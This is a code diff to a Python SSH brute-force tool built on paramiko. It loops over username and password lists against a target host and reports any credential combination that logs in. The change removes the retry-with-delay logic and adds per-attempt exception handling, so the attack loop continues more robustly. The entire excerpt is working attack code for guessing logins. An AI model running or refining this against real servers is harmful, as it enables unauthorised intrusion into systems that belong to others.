@@ -28,11 +28,6 @@ def is_ssh_open(hostname, username, password, port):
     except paramiko.AuthenticationException:
         print(f"[!] Invalid credentials for {username}:{password}")
         return False
-    except paramiko.SSHException:
-        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
-        # sleep for a minute
-        time.sleep(60)
-        return is_ssh_open(hostname, username, password, port)
     else:
         # connection was established successfully
         print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
@@ -52,11 +47,13 @@ def brute_force(host, port):
     try:
         for username in userlist:
             for password in passlist:
-                if is_ssh_open(host, username, password, port):
-                    # if combo is valid, save it to a file
-                    return f"Successfully logged in with {username}@{host}:{password}"
-                    break
-
+                try:
+                    if is_ssh_open(host, username, password, port):
+                        # if combo is valid, save it to a file
+                        return f"Successfully logged in with {username}@{host}:{password}"
+                        break
+                except paramiko.SSHException:
+                    return f"WARNING: paramiko.ssh_exception.SSHException: Error reading SSH protocol banner with host: '{host}', port: '{port}', username: '{username}', and password: '{password}'"
         return "Failed to log in. Exhausted all different username/password combinations."
     except:
         return f"Could not connect to port {port} on {host}."
